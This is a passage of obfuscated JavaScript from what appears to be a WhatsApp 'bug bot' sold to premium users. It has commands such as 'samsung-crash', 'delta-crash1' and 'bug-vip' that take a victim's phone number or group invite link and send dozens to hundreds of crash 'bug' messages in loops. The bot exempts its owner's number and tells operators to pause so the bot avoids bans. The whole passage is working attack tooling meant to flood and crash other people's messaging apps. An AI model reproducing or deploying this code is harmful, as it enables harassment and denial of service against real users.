            return _0x5c4040("Amount must be a number");
          }
          let _0x3f96bc = _0x4aa54e.replace(/[^0-9]/g, '');
          let _0x1fd5a2 = '' + encodeURI(_0x47bfad);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x3f96bc + '@s.whatsapp.net');
          let _0x4daaba = _0x3f96bc + "@s.whatsapp.net";
          if (_0x3f96bc == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x4daaba, _0x1fd5a2);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x4daaba.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x4daaba]);
        }
        break;
      case "delta-novo":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x598972 = _0x1b77d5.split(',')[0x0];
          let _0x302da1 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x598972 || !_0x302da1) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x302da1))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0xfd2f7b = _0x598972.replace(/[^0-9]/g, '');
          let _0x2c6982 = '' + encodeURI(_0x302da1);
          var _0x42504b = await _0x29487e.onWhatsApp(_0xfd2f7b + "@s.whatsapp.net");
          let _0x1d5522 = _0xfd2f7b + "@s.whatsapp.net";
          if (_0xfd2f7b == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x1d5522, _0x2c6982);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x1d5522.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x1d5522]);
        }
        break;
      case 'delta-crash1':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x5e5f74 = _0x1b77d5.split(',')[0x0];
          let _0x5caad9 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x5e5f74 || !_0x5caad9) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x5caad9))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x1fa8db = _0x5e5f74.replace(/[^0-9]/g, '');
          let _0xbecc0a = '' + encodeURI(_0x5caad9);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x1fa8db + '@s.whatsapp.net');
          let _0x294225 = _0x1fa8db + '@s.whatsapp.net';
          if (_0x1fa8db == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x294225, _0xbecc0a);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x294225.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x294225]);
        }
        break;
      case "ui-grup":
        {
          if (!_0x5e0f00) {
            return _0x5c4040(mess.prem);
          }
          if (!_0x1b77d5) {
            return _0x5c4040("*HOW TO SEND BUG TO GROUP*\n\n" + (_0x460782 + _0x256829) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + _0x256829 + " linkgc amount\n\nExample:\n." + _0x256829 + " https://chat.whatsapp.com/xxxx 10");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          if (!_0x1b77d5.split(" ")[0x0].includes('whatsapp.com')) {
            return _0x5c4040("Link Invalid!");
          }
          let _0x3a6386 = _0x1b77d5.split(" ")[0x0].split("https://chat.whatsapp.com/")[0x1];
          try {
            let _0x524804 = _0x1b77d5.split(" ")[0x1] ? _0x1b77d5.split(" ")[0x1] : '1';
            let _0x3dd37b = await _0x29487e.groupAcceptInvite(_0x3a6386);
            await sleep(0x7d0);
            _0xe54870(_0x3dd37b, _0x524804);
            await sleep(0x9c4);
            _0x5c4040("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
            _0x29487e.groupLeave(_0x3dd37b);
          } catch (_0x1acc04) {
            _0x5c4040(util.format(_0x1acc04));
          }
        }
        break;
      case "reset-ui":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x18ef60 = _0x1b77d5.split(',')[0x0];
          let _0x353216 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x18ef60 || !_0x353216) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x353216))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x387d7a = _0x18ef60.replace(/[^0-9]/g, '');
          let _0x271d07 = '' + encodeURI(_0x353216);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x387d7a + "@s.whatsapp.net");
          let _0x51bf59 = _0x387d7a + "@s.whatsapp.net";
          if (_0x387d7a == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x51bf59, _0x271d07);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x51bf59.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x51bf59]);
        }
        break;
      case "addprem":
        {
          if (!_0x46a982) {
            return _0x5c4040(mess.only.owner);
          }
          if (!_0x135d23[0x0]) {
            return _0x5c4040("Usage " + (_0x460782 + _0x256829) + " number\nContact " + (_0x460782 + _0x256829) + " 94742274855");
          }
          prrkek = q.split('|')[0x0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          let _0x33cdcc = await _0x29487e.onWhatsApp(prrkek);
          if (_0x33cdcc.length == 0x0) {
            return _0x5c4040("Enter a valid and registered number on WhatsApp!!!");
          }
          _0x24d502.push(prrkek);
          fs.writeFileSync("./all/database/premium.json", JSON.stringify(_0x24d502));
          _0x5c4040("number " + prrkek + " Telah Menjadi Premium!");
        }
        break;
      case "devilbug":
      case '🌹':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x207ef7 = q.replace(/[^0-9]/g, '');
          if (_0x207ef7.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x49898c = _0x207ef7 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x26d12c = 0x0; _0x26d12c < 0x1e; _0x26d12c++) {
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
            await _0x56a1f9(_0x49898c, _0x16bebe);
            await _0x29f40b(_0x49898c, _0x1c96d1);
          }
          await _0x5c4040("✅ Successfully Send Bug to " + _0x207ef7 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "bug-vip":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x274da4 = q.replace(/[^0-9]/g, '');
          if (_0x274da4.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x2c7a8c = _0x274da4 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x3d1ce3 = 0x0; _0x3d1ce3 < 0x1e; _0x3d1ce3++) {
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0xac0c3(_0x2c7a8c, _0x1c96d1);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0xac0c3(_0x2c7a8c, _0x1c96d1);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
            await _0x56a1f9(_0x2c7a8c, _0x16bebe);
            await _0xac0c3(_0x2c7a8c, _0x1c96d1);
            await _0x29f40b(_0x2c7a8c, _0x1c96d1);
          }
          await _0x5c4040("✅ Successfully Send Bug to " + _0x274da4 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "notif-ui":
      case "delta-virus":
      case "crash-total":
      case '🔥':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x1a0a70 = q.replace(/[^0-9]/g, '');
          if (_0x1a0a70.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x398dd2 = _0x1a0a70 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x4146c9 = 0x0; _0x4146c9 < 0x1e; _0x4146c9++) {
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
            await _0x29f40b(_0x398dd2, _0x1c96d1);
            await _0xac0c3(_0x398dd2, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x1a0a70 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "chace-bug":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x498c0d = q.replace(/[^0-9]/g, '');
          if (_0x498c0d.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x7cd81b = _0x498c0d + '@s.whatsapp.net';
          await _0x5c4040("In proses....");
          for (let _0x538ebf = 0x0; _0x538ebf < 0x32; _0x538ebf++) {
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
            await _0x29f40b(_0x7cd81b, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x498c0d + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'samsung-ui':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x50cb32 = q.replace(/[^0-9]/g, '');
          if (_0x50cb32.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x5234b3 = _0x50cb32 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x214f57 = 0x0; _0x214f57 < 0x32; _0x214f57++) {
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
            await _0x29f40b(_0x5234b3, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x50cb32 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "samsung-internal":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x1a6bba = q.replace(/[^0-9]/g, '');
          if (_0x1a6bba.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x4196be = _0x1a6bba + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x53ce1f = 0x0; _0x53ce1f < 0x32; _0x53ce1f++) {
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
            await _0x29f40b(_0x4196be, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x1a6bba + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'samsung-external':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x4aec8b = q.replace(/[^0-9]/g, '');
          if (_0x4aec8b.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x1e9772 = _0x4aec8b + '@s.whatsapp.net';
          await _0x5c4040("In proses....");
          for (let _0x16df2e = 0x0; _0x16df2e < 0x32; _0x16df2e++) {
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
            await _0x29f40b(_0x1e9772, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x4aec8b + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "samsung-crash":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x17b441 = q.replace(/[^0-9]/g, '');
          if (_0x17b441.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x1cdfa3 = _0x17b441 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x2eb8b5 = 0x0; _0x2eb8b5 < 0x32; _0x2eb8b5++) {
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
            await _0x29f40b(_0x1cdfa3, _0x26c51b);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x17b441 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'samsung-reboot':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x471407 = q.replace(/[^0-9]/g, '');
          if (_0x471407.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x58507f = _0x471407 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x554863 = 0x0; _0x554863 < 0x32; _0x554863++) {
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
            await _0x29f40b(_0x58507f, _0x26c51b);
